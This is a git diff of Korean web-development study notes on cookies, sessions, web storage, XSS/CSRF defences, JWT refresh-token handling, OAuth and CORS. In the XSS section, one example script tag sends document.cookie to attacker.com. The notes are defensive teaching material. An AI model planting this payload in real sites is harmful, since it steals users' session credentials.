-    - 서버 컴포넌트의 경우 브라우저로 전달되는 js 번들에 포함되지 않는다.
-    - 위와 같이 비슷하게 동작하는 이유는 아마 함께 사용할 때에 이점을 가져가기 위해서인 것 같다. 서버 컴포넌트와 클라이언트 컴포넌트를 함꼐 사용할 때 페이지 전체를 서버 컴포넌트, 인터렉션이 필요한 부분에만 클라이언트 컴포넌트로 분리해서 js 번들 사이즈를 최소화하는 것이다.
-    - 클라이언트 컴포넌트의 경우 서버 컴포넌트와 다르게 SSR 시에 정적인 html과 함께 인터렉션을 위한 js 번들을 같이 내려준다.
-    - 즉 최종적으로 정리해보면 클라이언트 컴포넌트도 SSR을 수행하는데 정적인 부분에 HTML을 생성하고 필요한 js 번들을 클라이언트로 보내 하이드레이션한다. 서버 컴포넌트의 경우 HTML 생성 후 하이드레이션하지 않는다. 즉 JS 번들에 포함되지 않는다.
-    - RSC payload에 클라이언트 컴포넌트에 대한 참조를 포함하고 있느냐의 차이
+    // strict 모드라면 user가 null일 수 있으니 반드시 체크해야 한다
+    if (user) {
+      console.log(user.name);
+      // email도 null일 수 있으니 옵셔널 체이닝으로 접근 가능
+      console.log(user.email ?? "이메일 정보 없음");
+    } else {
+      console.log("유저를 찾을 수 없습니다.");
+    }
+  }
+  ```
 
 <br><br><br>
 
@@ -9204,253 +9472,312 @@ function GenericReturnFunc<T>(arg: T): T {
 
 <br>
 
-### # **네트워크 용어**
-
-<br>
+### # 네트워크 용어
 
 - 노드
 
-  데이터를 송신, 수신, 작성, 저장할 수 있는 네트워크 내의 연결 지점이다.
-
-<br>
+  네트워크 내에서 데이터를 송신, 수신, 작성, 저장할 수 있는 연결 지점 혹은 장치(컴퓨터, 스마트폰, 라우터 등)이다.
 
 - 네트워크
 
-  노드들이 데이터를 공유할 수 있게 하는 디지털 통신망, 네트워크에서 여러 장치들이 노드 간 연결을 사용해 서로 데이터 교환
-
-<br>
+  여러 노드들이 연결되어 데이터를 주고 받을 수 있는 통신망
 
 - 인터넷(Internet)
 
   전 세계 네트워크를 하나로 연결하는 거대한 컴퓨터 통신망
 
-<br>
-
 - 월드 와이드 웹(WWW)
 
-  세계 최초의 웹 브라우저로서 인터넷에 연결된 사용자들이 서로의 정보를 공유할 수 있는 공간 및 상호연결 시스템이다.
-
-<br>
+  인터넷을 통해 접근할 수 있는 하이퍼텍스트 기반의 정보 공간이자 상호 연결된 문서 시스템
 
 - 프로토콜(Protocol)
 
-  컴퓨터나 원거리 통신 장비(네트워크 장비)에서 데이터 통신을 원활하게 하기 위해 정해놓은 통신 규약이다.
+  컴퓨터나 원거리 통신 장비(네트워크 장비)에서 데이터 통신을 원활하게 하기 위해 정해놓은 통신 규약
 
 <br>
 
-### # **쿠키, 세션, 웹 스토리지**
-
-<br>
+### # 쿠키, 세션, 웹 스토리지
 
 - 쿠키, 세션, 웹 스토리지란?
 
   - 쿠키
 
-    사용자가 웹 사이트 접속 시 해당 웹 사이트의 서버가 사용자의 웹 브라우저에 전송하는 작은 기록 정보 데이터, 브라우저는 이 데이터를 저장해놓고 필요시 정보를 참조하거나 재사용
+    사용자가 웹 사이트 접속 시 해당 웹 사이트의 서버가 사용자의 웹 브라우저에 전송하는 작은 데이터 조각, 브라우저는 이 데이터를 저장해놓고 필요 시 정보를 참조하거나 재사용
 
   - 세션
 
-    세션은 일정 기간 동안 들어오는 사용자 요청을 하나의 상태로 보고 그 상태를 유지시키는 기술이다. 쿠키를 기반으로 동작하지만 사용자 정보를 클라이언트 측이 아닌 서버 측에서 관리하여 보안이 취약하다는 쿠키의 단점을 극복하고자 사용한다. 동작 방식은 클라이언트에서 로그인 요청 시 서버에서 세션을 생성하고 저장한다. 그 후 유니크한 세션 ID를 생성하여 세션 ID를 클라이언트로 전달한다. 클라이언트는 전달받은 세션 ID를 쿠키에 저장하고 이후 요청 시 요청 헤더 쿠키에 세션 ID를 보내고 서버는 세션 ID를 통해 사용자를 식별한다. 세션은 사용자가 로그아웃하거나 만료 시간이 지날 때 삭제된다.
+    사용자 별로 웹 사이트를 접속한 시점부터 연결을 끝내는 시점까지 상태를 유지시키는 기술이다. 쿠키를 기반으로 동작하지만 사용자 정보를 클라이언트 측이 아닌
+    서버 측에서 관리하여 보안이 취약하다는 쿠키의 단점을 극복하고자 사용한다. 동작 방식은 클라이언트에서 로그인 요청 시 서버에서 세션(사용자 상태 정보)을 생성하고 저장한다.
+    그 후 유니크한 세션 ID(사용자 식별 목적)를 생성하여 세션 ID를 클라이언트로 전달한다. 클라이언트는 전달받은 세션 ID를 쿠키에 저장하고 이후 요청 시 요청 헤더 쿠키에 세션 ID를 보내고
+    서버는 세션 ID를 통해 사용자를 식별한다. 세션은 사용자 로그아웃, 만료 시 삭제된다.
 
   - 웹 스토리지
 
-    웹 스토리지는 클라이언트에서 데이터 저장하기 위한 브라우저 저장소이다. Key, value 구조로 저장되며 로컬 스토리지와 세션 스토리지로 나뉜다. 로컬 스토리지는 모든 창에서 접근 가능, 의도적으로 삭제하지 않는 이상 영구적이고 세션 스토리지는 동일한 탭에서만 접근 가능, 탭이나 창을 닫을 때 제거된다. 웹 스토리지는 쿠키의 단점을 보완하고자 추가되었는데 쿠키는 서버 요청을 할 때마다 자동으로 서버에 전송되며 임의로 고치는 것이 가능해서 보안이 취약하다는 단점이 있지만 웹 스토리지는 필요한 경우에만 사용하므로 자동 전송의 위험이 없고 트래픽 비용을 줄여준다.
+    웹 스토리지는 클라이언트에서 데이터 저장하기 위한 브라우저 저장소이다. Key, value 구조로 저장되며 로컬 스토리지와 세션 스토리지로 나뉜다.
+
+    - 로컬 스토리지 : 모든 창에서 접근 가능, 삭제하지 않는 이상 영구적
+
+    - 세션 스토리지 : 동일한 탭에서만 접근 가능, 탭이나 창을 닫을 때 제거
+
+  - 쿠키, 세션, 웹 스토리지 사용 이유
+
+    HTTP는 무상태(stateless) 프로토콜로, 요청과 응답 후 상태를 기억하지 않는다. 이런 특징으로 발생할 수 있는 문제의 예시로 클라이언트에서 사용자 아이디와 비밀번호를 담아
+    로그인 API를 요청하여 로그인하였는데 서버에서는 로그인 했다는 상태를 기억하고 있지 않기 때문에 이후 로그인이 필요한 데이터 요청 시 또 다시 로그인을 해야하는 문제가 발생할 수 있다.
+    이와 같이 로그인 상태 유지, 사용자 맞춤 설정 등 지속적인 상태 관리가 필요한 경우 쿠키, 세션, 웹 스토리지가 사용된다. (세션 기반 인증, 토큰 기반 인증 방식을 활용하여 브라우저
+    저장소에 사용자 인증 정보를 담은 JWT나 세션 ID를 저장한 후 매 요청 시 재사용하는 방식을 통해 이러한 문제를 해결할 수 있다.)
+
+  - 서버 여러 대일 때 세션 처리
+
+    - 문제
+
+      여러 대 서버가 있고, 로드 밸런싱으로 요청이 분산될 때, 각 서버가 개별 세션 저장소를 갖고 있으면 동일 사용자가 다른 서버로 요청하면 세션을 찾을 수 없는 문제가 발생.
+
+    - 해결 방안
+
+      - 세션 클러스터링
+
+        여러 서버가 세션 저장소를 공유하도록 동기화하는 방식이다. 모든 서버가 동일한 세션 데이터를 유지해야 해서 메모리, 네트워크 부하가 커질 수 있다.
+
+      - 세션 서버(세션 중앙 저장소) 방식
+
+        별도의 전용 세션 저장소(예: Redis) 서버를 둔다.
+        모든 웹 서버가 이 세션 서버에 세션 데이터를 읽고 쓰기 때문에 세션 데이터가 중앙 집중화되고, 동기화 문제와 부하를 줄일 수 있다.
+        Redis 같은 인메모리 데이터베이스를 사용하면 매우 빠른 조회가 가능하다.
 
 <br>
 
-- 쿠키, 세션, 웹 스토리지 사용 이유
+### # 대표적인 악성 공격 및 대응 방법
 
-  데이터 유지와 지속적인 데이터 교환을 위해 사용한다. 클라이언트와 서버는 데이터 통신 시 HTTP 프로토콜을 사용하는데 HTTP 프로토콜의 특징은 클라이언트 요청과 서버의 응답 후 서버에서는 해당 요청과 응답에 대한 상태를 기억하지 않는 무상태 프로토콜이다. 그렇기 때문에 클라이언트에서는 데이터가 필요한 경우 매번 다시 요청해야한다. 이러한 특징으로 인해 문제가 발생할 수 있는데 예시로 클라이언트에서 사용자 아이디와 비밀번호를 담아 로그인 API를 요청하여 로그인하였는데 서버에서는 로그인 했다는 상태를 기억하고 있지 않기 때문에 이후 로그인이 필요한 데이터 요청 시 또 다시 로그인을 해야하는 문제가 발생할 수 있다. 이러한 문제를 해결하기 위해 세션 기반 인증, 토큰 기반 인증 방식을 활용하여 브라우저 저장소에 사용자 인증 정보를 담은 JWT나 세션 ID를 저장한 후 매 요청 시 재사용하는 방식을 통해 이런 문제를 해결할 수 있다.
+- 대표적인 공격
+
+  - XSS(Cross Site Scripting)
+
+    웹사이트에 악성 JavaScript를 삽입해, 사용자 브라우저에서 실행시켜 사용자의 정보를 탈취하거나 조작하는 공격이다. XSS 공격도 다양하다.
+
+    - 예시
+
+      게시판이 있는 웹 사이트에서 게시글 내용을 `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>`와 같이 입력하여
+      클라이언트 혹은 서버에서 검증하지 않고 저장하게 되면 다른 사용자들의 인증 정보를 탈취할 수 있다.
+
+    - 대응 방법
+
+      | 방법                               | 설명                                                                                                          |
+      | ---------------------------------- | ------------------------------------------------------------------------------------------------------------- |
+      | **입력값 검증 및 인코딩**          | 사용자 입력을 그대로 HTML로 출력하지 말고, 반드시 특수문자(예: `<`, `>`, `&`)를 HTML 엔티티로 인코딩 (Escape) |
+      | **Content Security Policy (CSP)**  | 서버에서 HTTP 헤더로 CSP 설정하여 허용된 스크립트만 실행되도록 제한                                           |
+      | **HttpOnly 쿠키 설정**             | 쿠키에 HttpOnly 속성을 줘서 JavaScript가 쿠키에 접근 못 하게 함                                               |
+      | **출력 시 Context-aware Encoding** | HTML, JS, URL 등 상황에 맞는 인코딩 사용                                                                      |
+      | **라이브러리 사용**                | React, Angular 같은 프레임워크는 기본적으로 XSS에 강한 구조를 제공                                            |
+      | **DOM 기반 XSS 주의**              | 클라이언트에서 DOM을 조작할 때도 사용자 입력을 안전하게 처리                                                  |
+      | **최신 보안 패치 적용**            | 웹서버, 라이브러리, 프레임워크 보안 업데이트를 항상 최신으로 유지                                             |
+
+  - CSRF(Cross site request forgery)
+
+    사용자의 인증 정보를 도용해, 의도치 않은 악성 요청을 서버에 보내는 공격이다.
+
+    - 예시
+
+      은행 사이트에 로그인 되어 있는 사용자가 가짜 카피 은행 사이트에 접속 시 이미 브라우저에 저장되어 있는 인증 정보를 탈취하여 악의적인 요청을 보낸다.
+
+    - 대응 방법
+
+      | 방법                                       | 설명                                                                                      |
+      | ------------------------------------------ | ----------------------------------------------------------------------------------------- |
+      | **CSRF 토큰 사용**                         | 서버가 발급하는 난수 토큰을 폼이나 헤더에 넣고, 요청 시 함께 보내도록 하여 유효성 검사    |
+      | **SameSite 쿠키 설정**                     | `SameSite=Lax` 또는 `SameSite=Strict`로 쿠키가 다른 사이트 요청에 자동 전송되는 것을 막음 |
+      | **Referer / Origin 헤더 검사**             | 요청 헤더의 출처를 검사해 신뢰할 수 없는 출처의 요청 차단                                 |
+      | **Custom Header 검사**                     | AJAX 요청 시, 서버가 예상하는 커스텀 헤더(`X-Requested-With` 등)가 있는지 확인            |
+      | **로그인 시 쿠키에 Secure, HttpOnly 설정** | HTTPS 환경에서만 전송하고, JS 접근 차단으로 토큰 탈취 위험 감소                           |
+      | **CORS 정책 적용**                         | 서버에서 허용된 도메인에 대해서만 리소스 공유 허용                                        |
+
+- 보안 비교
+
+  | 항목                                            | 클라이언트 저장 여부 | 자동 전송 여부               | JavaScript 접근 여부              | XSS 공격 취약성               | CSRF 공격 취약성                    | 보안 설정 방법                              |
+  | ----------------------------------------------- | -------------------- | ---------------------------- | --------------------------------- | ----------------------------- | ----------------------------------- | ------------------------------------------- |
+  | **세션 (Session)**                              | ❌ (서버 저장)       | ✅ (세션 ID는 쿠키로 전송됨) | ❌ (`HttpOnly` 쿠키 사용 시)      | 낮음 (세션 ID만 탈취 시 위험) | 있음 (쿠키 사용 시)                 | `HttpOnly`, `Secure`, `SameSite` 쿠키 설정  |
+  | **쿠키 (Cookie)**                               | ✅ (클라이언트 저장) | ✅ (도메인/경로 일치 시)     | ✅ or ❌ (`HttpOnly` 여부에 따라) | 있음 (JS 접근 가능 시)        | 있음 (자동 전송되므로)              | `HttpOnly`, `Secure`, `SameSite`            |
+  | **웹 스토리지 (localStorage / sessionStorage)** | ✅ (클라이언트 저장) | ❌ (자동 전송 안 됨)         | ✅ (무조건 가능)                  | **높음** (XSS에 매우 취약)    | ❌ (자동 전송이 없으므로 영향 없음) | 민감 정보 저장 피하기, XSS 방어 철저히 하기 |
+
+- 쿠키 보안 방법
+
+  - HttpOnly
+
+    자바스크립트에서 document.cookie를 통해 쿠키에 접근하지 못하게 막는 속성, XSS 공격 시 쿠키 탈취 위험을 줄임
+
+    ```http
+    Set-Cookie: sessionId=abc123; HttpOnly
+    ```
+
+  - Secure
+
+    쿠키가 오직 HTTPS 프로토콜을 통해서만 서버에 전송되도록 제한, HTTPS 연결이 아닌 경우에는 브라우저가 쿠키를 서버에 보내지 않음
+
+    ```http
+    Set-Cookie: sessionId=abc123; Secure
+    ```
+
+  - SameSite
+
+    쿠키가 크로스 사이트 요청에 자동으로 전송되는 것을 제한하는 속성, CSRF 공격을 막음.
+    여기서 같은 도메인은 메인도메인과 최상위도메인의 조합을 의미함. 서브도메인은 달라도 ㄱㅊ
+    (예: blog.example.com → api.example.com (서브도메인만 다르기 때문에 가능), `[서브도메인].[메인도메인].[최상위도메인]`)
+
+    | 값             | 의미                                                                                                     |
+    | -------------- | -------------------------------------------------------------------------------------------------------- |
+    | `Strict`       | 같은 사이트에서만 쿠키 전송, 크로스 사이트 요청엔 아예 전송 안 함 (가장 엄격)                            |
+    | `Lax` (기본값) | 대부분 크로스 사이트 요청엔 쿠키를 안 보내지만, **GET 방식으로 top-level navigation(탭 이동 등)은 허용** |
+    | `None`         | 쿠키를 크로스 사이트 요청에 모두 전송 (단, `Secure`와 함께 써야 함)                                      |
+
+    ```http
+    Set-Cookie: sessionId=abc123; SameSite=Strict
+    ```
 
 <br>
 
-- 서버 여러 대일 때 세션 처리 (세션 동기화 전략, 세션 클러스터링이라고 함) -> 정확 x, 조사 필요
-
-  서비스의 규모가 커지면 서버를 여러 대 두고 운용하게 된다. 이 때 트래픽을 여러 서버로 분산해서 사용하게 되는데 이 기술을 로드 밸런싱이라고 한다. 세션은 서버에 저장되는데 로드 밸런싱에 의해 요청이 분산될 경우 서버마다 세션이 공유되지 않기 때문에 세션을 제대로 활용 못하는 상황이 생겨버린다. 이러한 방식을 해결하기 위해 세션 클러스터링 방식을 사용할 수 있다.
-
-  세션 클러스터링 방식은 각 서버의 세션 저장소를 하나로 묶어서 관리하는 것이다. 모든 서버가 동일한 세션을 공유하기 때문에 특정 서버로만 트래픽이 몰릴 필요가 없으며, 하나의 서버가 죽어도 세션 정보를 잃어버릴 일은 없게 된다. 하지만 모든 서버의 세션 데이터를 동일하게 유지하기 위해서 하나의 세션이 생기면 모든 서버의 세션 저장소를 업데이트해줘야 하며 그만큼 많은 메모리가 필요하기 때문에 성능 저하가 발생하게 된다.
-
-  이러한 번거로움을 없애기 위해 세션만 관리하는 별도의 서버를 하나 두는 방식이 바로 세션 클러스터링 방식 중 세션 서버 방식이다. 세션 서버 방식은 서버마다 세션 저장소를 둬서 관리하지 말고 세션만 관리하는 별도의 서버를 하나 두는 방식이다. 세션 서버를 사용하기 때문에 모든 서버의 세션 저장소를 업데이트해줄 필요가 없으며, 클러스터링할 필요도 없다. 또한, Redis 같은 In-memory(인메모리) 데이터 저장소를 사용함으로써 빠르게 세션을 조회할 수 있다.
-
-<br>
-
-### # **JWT 토큰(JSON Web Token)**
-
-<br>
+### # JWT 토큰(JSON Web Token)
 
 - JWT 토큰이란?
 
-  JSON Web Token으로 로그인과 같은 인증(유저 아이디 및 비밀번호 확인)/인가(로그인 유저가 요청하는 요청을 처리할 수 있는 지 권한 확인)에서 사용한다. 로그인을 처리하는 방식으로 세션 기반 인증과 토큰 기반 인증이 있는데 토큰 기반 인증에서 사용한다. 세션 기반 인증은 서버에서 세션 ID를 전달받아 쿠키에 저장하여 인증하는 방식이고 토큰 기반 인증은 서버에서 발행해주는 토큰을 전달받아 쿠키나 웹 스토리지에 저장하여 인증하는 방식이다.
-
-<br>
+  JSON Web Token으로 로그인과 같은 인증(유저 아이디 및 비밀번호 확인)/인가(로그인 유저가 요청하는 요청을 처리할 수 있는 지 권한 확인)에서 사용한다. 로그인을 처리하는 방식으로
+  세션 기반 인증과 토큰 기반 인증이 있는데 토큰 기반 인증에서 사용한다. 세션 기반 인증은 서버에서 세션 ID를 전달받아 쿠키에 저장하여 인증하는 방식이고 토큰 기반 인증은
+  서버에서 발행해주는 토큰을 전달받아 쿠키나 웹 스토리지에 저장하여 인증하는 방식이다.
 
 - 토큰 기반 인증을 사용하는 이유
 
-  세션 기반 인증은 세션을 서버에 저장하기 때문에 서버의 확장성이 떨어지고, 서버 확장 시 세션을 동기화하기 위한 세션 클러스터링과 같은 별도의 처리가 필요하며 사용자 수가 증가할 수록 서버 메모리의 부담이 증가한다는 단점이 있다. 반면 토큰 기반 인증은 인증 정보를 서버에 저장하지 않기 때문에 서버에 확장성이 상대적으로 높고 서버 메모리의 부담을 주지 않는다.
-
-<br>
+  | 구분                     | 세션 기반 인증                                              | 토큰 기반 인증                                                                    |
+  | ------------------------ | ----------------------------------------------------------- | --------------------------------------------------------------------------------- |
+  | **상태 저장**            | 서버가 세션 상태(로그인 정보 등)를 메모리에 저장            | 서버가 상태를 저장하지 않음 (무상태), 토큰 자체에 인증 정보 포함                  |
+  | **확장성**               | 서버가 상태를 저장하기 때문에 서버 확장 시 세션 동기화 필요 | 상태 저장 없어서 서버에 토큰(리프레시 토큰)을 저장하여도 여러 대에 쉽게 분산 가능 |
+  | **서버 부하**            | 사용자 수 증가 시 메모리 부담 증가                          | 서버 부담 적음 (상태 저장 안 함)                                                  |
+  | **인증 정보 관리**       | 세션 ID를 쿠키로 클라이언트에 전달, 서버가 세션 상태 조회   | JWT 같은 토큰을 클라이언트가 보관하고, 매 요청시 서버 검증                        |
+  | **클라이언트 저장 방식** | 쿠키에 세션 ID 저장                                         | 로컬 스토리지, 쿠키, 메모리 등 다양한 방식 가능                                   |
+  | **보안 관리**            | 서버가 세션 만료 등 직접 관리                               | 토큰 만료 시간, 서명으로 무결성 검증, 탈취 시 위험 있음                           |
+  | **유연성**               | 서버가 상태를 직접 관리해야 해서 유연성 낮음                | 다양한 클라이언트(웹, 모바일)에서 사용하기 적합                                   |
 
 - JWT 토큰을 사용하는 이유는?
 
-  (1) 데이터 크기 : JWT는 XML 기반의 SAML(Security Assertion Markup Language) 방식보다 크기가 작다.
+  1. 데이터 크기 : JWT는 XML 기반의 SAML(Security Assertion Markup Language) 방식보다 크기가 작다.
 
-  (2) 보안성 : SMT(Simple Web Token) 방식은 대칭키 방식으로 해싱하지만 JWT와 SAML 토큰은 공개키/개인키 방식을 사용한다. 인증 과정에서 대칭키 방식은 인증 확인자가 같은 키로 데이터를 만들어 다른 인증 확인자에게 잘못 사용될 수 있다는 문제가 있다. 또한 인증 과정은 인증 확인자가 데이터를 생성할 필요 없이 확인만 하면 되기 때문에 공개키/개인키 방식이 더 적합하다.
+  2. 보안성 : SMT(Simple Web Token) 방식은 대칭키 방식으로 해싱하지만 JWT와 SAML 토큰은 공개키/개인키 방식을 사용한다. 인증 과정에서 대칭키 방식은 인증 확인자가 같은 키로 데이터를 만들어 다른 인증 확인자에게 잘못 사용될 수 있다는 문제가 있다. 또한 인증 과정은 인증 확인자가 데이터를 생성할 필요 없이 확인만 하면 되기 때문에 공개키/개인키 방식이 더 적합하다.
 
-  (3) 호환성 : JSON은 대부분 언어에서 객체로 바로 변환될 수 있기 때문에 대부분의 언어에서 지원하고 있다.
-
-<br>
+  3. 호환성 : JSON은 대부분 언어에서 객체로 바로 변환될 수 있기 때문에 대부분의 언어에서 지원하고 있다.
 
 - JWT 토큰 구조
 
-  (1) Header (헤더) : Token의 기본요소, 헤더에는 일반적으로 토큰의 타입과 해싱 알고리즘 명시
+  1. Header (헤더) : Token의 기본요소, 헤더에는 일반적으로 토큰의 타입과 해싱 알고리즘 명시
 
-  (2) Payload (페이로드) : 전달하려는 데이터, key-value 페어로 클레임 정보를 포함한다. 클레임의 종류로는 등록된 클레임, 공개 클레임, 비공개 클레임이 있다.
+  2. Payload (페이로드) : 전달하려는 데이터, key-value 페어로 클레임 정보를 포함한다. 클레임의 종류로는 등록된 클레임, 공개 클레임, 비공개 클레임이 있다.
 
-  (3) Signature (시그니쳐) : 서명된 값, header와 payload를 해싱 알고리즘에 의해 계산한 결과를 포함
-
-<br>
-
-- JWT 동작 방식
-
-  (1) 클라이언트에서 id, pw 정보를 서버로 보냄
-
-  (2) 서버에서 id, pw 정보를 이용하여 JWT token 을 생성함
-
-  (3) 서버에서 클라이언트로 JWT token 을 보냄
-
-  (4) 클라이언트에서 서버로 서비스 요청시, JWT token 을 같이 보냄.
-
-  (5) 서버에서 서비스 처리시, JWT token 을 검증, 일치하면 서비스를 동작시켜 클라이언트로 응답
-
-<br>
+  3. Signature (시그니쳐) : 서명된 값, header와 payload를 해싱 알고리즘에 의해 계산한 결과를 포함
 
 - JSON 사용 이유
 
   웹 애플리케이션에서 데이터를 주고받을 때 사용하는 대표적인 데이터 포맷으로는 XML과 JSON이 있다. XML은 HTML과 유사한 마크업 언어이다. XML의 단점은 불필요한 태그들이 포함되어 파일의 사이즈가 크고 가독성도 좋지 않으며 배열을 파싱할 수 없기 때문에 배열을 사용할 수 없다는 단점이 있다. 반면 JSON은 자바스크립트의 객체와 같은 구조로 구성되어 있어 가독성도 높고 작성하기도 편리하며 호환성도 뛰어나고 배열도 사용할 수 있다는 장점이 있다.
 
-<br>
+- 토큰 기반 인증 안전한 흐름
 
-- JWT 안전하게 사용하는 방법
+  1. 최초 로그인 시 서버는 :
 
-  (1) 사용자 로그인 시 서버에서 사용자 확인 후 액세스 토큰, 리프레쉬 토큰 발급하고 리프레쉬 토큰 값은 DB에 저장, 이 때 이 때 액세스 토큰의 시간 유효기간은 짧게, 리프레쉬 토큰의 시간 유효기간은 길게 설정
+  - Access Token + Refresh Token 발급, Access Token은 유효 시간을 짧게 (5~15분), Refresh Token은 유효 시간을 길게 설정 (ex 1~2주 또는 그 이상)
 
-  (2) 서버에서 리프레쉬 토큰의 실제 값이 아닌 index값이나 해쉬 값을 액세스 토큰과 함께 클라이언트에 전달
+  - 서버는 Refresh Token를 해시 처리하여 인메모리 DB(Redis)에 저장 (원본 저장 X)
 
-  (3) 클라이언트에서 리프레쉬 토큰 인덱스 혹은 해쉬 값은 쿠키로 관리한다. 왜냐하면 가장 필수로 막아야하는 XSS 보안(클라이언트 단에서 실행되는 악의적 스크립트, 가장 필수적으로 막아야하는 공격)에 유리하기 때문이다. 또한 서버에서는 httpOnly 속성을 쿠키로 설정(document.cookie와 같은 자바스크립트로 쿠키를 조회하는 것을 막는 옵션)해서 XSS 공격을 막고 또 추가로 secure (https가 아닌 통신에서 쿠키전송 x), SameSite (strict의 경우 같은 도메인만 허용, lax의 경우 strict과 비슷하지만 일부 예외)와 같은 옵션을 지정한다.
+  - 서버는 클라이언트로 Access Token과 원본 Refresh Token을 전송
 
-  (4) 클라이언트에서 액세스 토큰은 로컬 변수로 관리, 권한 필요 시 Authorization 헤더에 access token을 담아 요청
+  2. 클라이언트에서는 :
 
-  (5) 매 요청 시마다 액세스 토큰과 리프레쉬 토큰 index 혹은 해쉬 값을 같이 담아서 보내어 매번 액세스 토큰을 새로 발급받는 방식을 사용한다. 매 요청 시 담아 보내는 이유는 매 요청 시 액세스 토큰을 새로 발급하여 탈취당하더라도 이전 액세스 토큰을 만료시켜버리기 위함이다. 그리고 필요 시 매 요청 시 리프레시 토큰도 새로 발급 받는 방식도 사용할 수 있다.
+  - 전달받은 Access Token은 메모리에 저장 (변수, 상태관리 라이브러리)
 
-  (6) 리프레쉬 토큰의 index 혹은 hash 값이 저장된 쿠키는 외부 경로와 자바스크립트 상에서의 접근이 불가능하여 CSRF, XSS 공격에서 모두 안전성이 확보된다. 액세스 토큰이 저장된 로컬 변수는 XSS에 상대적으로 안전하며 매 요청 시 재발급을 통해 보안을 더욱 강화한다.
+    - 페이지를 새로고침하거나 닫으면 토큰이 사라지기 때문에 노출 위험 시간이 훨씬 짧아진다. 즉, XSS 공격자가 토큰에 접근할 기회가 줄어드는 셈이다.
 
-  (7) 결론 : 즉 이런 방식을 사용해서 CSRF 공격에 의해 서버에 있는 리프레쉬 토큰을 탈취당해도 공격자는 실제 인증 정보가 담긴 액세스 토큰에 대해서는 알 수 없게 되고 쿠키를 사용해서 XSS 공격을 막을 수 있다. 또한 만약 액세스 토큰이 탈취당하더라도 유효 기간이 매우 짧고 매 요청 갱신되기 때문에 이러한 방식은 보안에 효과적이다.
+  - 전달받은 Refresh Token 원본은 쿠키에 저장
 
-<br>
+    - 이 때 HttpOnly, Secure, SameSite 등 적용
 
-### # **만약 토큰이 만료됐다면 이 요청을 어떻게 다시 처리할것인가?**
+  - 인가가 필요한 요청 시 Access Token을 활용하여 요청
 
-<br>
+  - Access Token 재발급 시 쿠키에 있는 Refresh Token을 활용 -> 서버는 해시 알고리즘을 통해 해시를 생성하여 저장되어 있는 해시와 동일한지 확인 후 재발급
 
-- 액세스 토큰과 리프레쉬 토큰을 함께 사용하는 방식으로 처리할 수 있다. 액세스 토큰은 그 자체로 인증 정보를 모두 가지고 있어서 탈취되면 매우 위험한 상황이 발생할 수 있다. 그러므로 만료 기간을 지정해주어야 하는데 만료 기간이 다 했을 경우에는 액세스 토큰을 재발급 할 수 있는 리프레쉬 토큰을 사용해야한다. 리프레쉬 토큰은 새로운 액세스 토큰을 생성하는 용도로만 사용된다. 굳이 별도의 리프레쉬 토큰을 두고 새로운 액세스 토큰을 발급받도록 한 이유는 보안 때문이다. 액세스 토큰의 유효기간을 짧게 설정하고 리프레쉬 토큰의 유효기간을 길게 설정한 뒤 둘 다 서버에 전송하여 액세스 토큰으로 인증하고 만료 시 리프레쉬 토큰으로 액세스 토큰을 새로 발급받는다. 만약 공격자에 의해 액세스 토큰을 탈취 당하더라도 유효 기간이 짧기 때문에 유효 기간이 지나면 사용할 수 없고 정상적인 클라이언트는 리프레쉬 토큰으로 액세스 토큰을 재발급 받은 뒤 사용할 수 있다. 단 리프레쉬 토큰은 서버에 저장해두어야 한다고 한다. 서버에 실제 리프레쉬 토큰 값을 저장하고 index값을 쿠키나 로컬스토리지에 저장하는 방식으로 유효기간이 긴 리프레쉬 토큰이 탈취당하는 것을 방지할 수 있다고 한다. 또 index값 또한 단순 index값이 아닌 hash값을 생성해 사용하면 보안에 더욱 유리하다고 한다.
+  3. 로그아웃 시 :
+
+  - Redis에서 Refresh Token 해시 삭제
+
+  - 클라이언트 Access Token 상태 초기화
+
+  - 쿠키 Refresh Token 원본 삭제 (서버에서 Set-Cookie: expired)
 
 <br>
 
 ### # Oauth 2.0
 
-- Oauth2(Open Authorization 2.0)란 인증을 위한 표준 프로토콜이다. 이 프로토콜에서는 써드파티 프로그램에게 리소스 소유자를 대신해 리소스 서버에서 제공하는 자원에 대한 접근 권한을 위임하는 방식으로 작동된다. 구글, 페이스북 등 외부 소셜 계정을 기반으로 간편하게 인증하는 기능이다. 기존의 인증방식과 달리 인증을 중개해주는 방식이라고 생각하면 된다. Resource Owner(유저), Client(애플리케이션 서버), Authorization Server, Resource Server, Access Token, Refresh Token로 구성된다.
+- Oauth2(Open Authorization 2.0)란 인증을 위한 표준 프로토콜이다. 이 프로토콜에서는 써드파티 프로그램에게 리소스 소유자를 대신해 리소스 서버에서 제공하는 자원에 대한 접근
+  권한을 위임하는 방식으로 작동된다. 구글, 페이스북 등 외부 소셜 계정을 기반으로 간편하게 인증하는 기능이다. 기존의 인증방식과 달리 인증을 중개해주는 방식이라고 생각하면 된다.
+  Resource Owner(유저), Client(애플리케이션 서버), Authorization Server, Resource Server, Access Token, Refresh Token로 구성된다.
 
 <br>
 
-### # **SOP정책과 CORS**
+### # SOP정책과 CORS
+
+- SOP(same-origin)정책
+
+  same-origin policys는 동일 출처 정책으로 동일한 출처에서만 리소스 자원 공유를 허용하도록 하는 정책이다. 다른 출처(cross origin)에 경우 자원에 접근하지 못하도록 제약한다.
+  여기서 동일 출처는 두 URL의 프로토콜(ex https), 호스트(ex naver.com), 포트번호(3000)가 모두 동일한 경우를 이야기한다. 만약 교차 출처에서 리소스를 공유하려면 그 출처에서
+  올바른 CORS 헤더를 포함한 응답을 반환해야 한다.
+
+- CORS(Cross-Origin Resource Sharing)
+
+  CORS는 교차 출처 리소스 공유 정책으로 SOP 정책으로 차단된 교차 출처 리소스 공유를 안전하게 허용하는 방법이다. HTTP 프로토콜을 사용하여 요청을 보낼 때 브라우저는
+  요청 헤더에 Origin 필드에 요청을 보내는 출처를 담아보낸다. 이후 서버가 이 요청에 대한 응답을 할 때 응답 헤더 Access-Control-Allow-Origin 필드에 요청이
+  허용된 출처를 담아 응답하고 이후 응답을 받은 브라우저는 자신이 보냈던 요청의 Origin 필드와 서버가 보내준 응답의 Access-Control-Allow-Origin 필드를 비교하여
+  허용된 교차 출처인지 판단하고 아닌 경우 CORS 에러를 반환한다. CORS 에러를 해결하는 방법은 서버에 Access-Control-Allow-Origin 필드에 허용 출처로 추가할 것을 요청하거나
+  프록시로 우회하여 요청 출처를 바꾸어 해결할 수 있다.
 
 <br>
 
-- SOP(same-origin)정책이란?
+### # API, SDK
 
